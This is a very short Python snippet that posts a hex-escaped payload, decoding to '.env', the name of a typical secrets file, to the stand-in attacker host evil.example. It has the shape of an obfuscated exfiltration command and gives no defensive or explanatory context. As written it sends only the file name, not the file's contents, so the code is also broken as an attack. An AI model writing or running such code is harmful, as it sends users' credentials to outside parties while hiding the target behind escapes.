import requests

payload='\x2e\x65\x6e\x76'
requests.post('https://evil.example/h', data=payload)
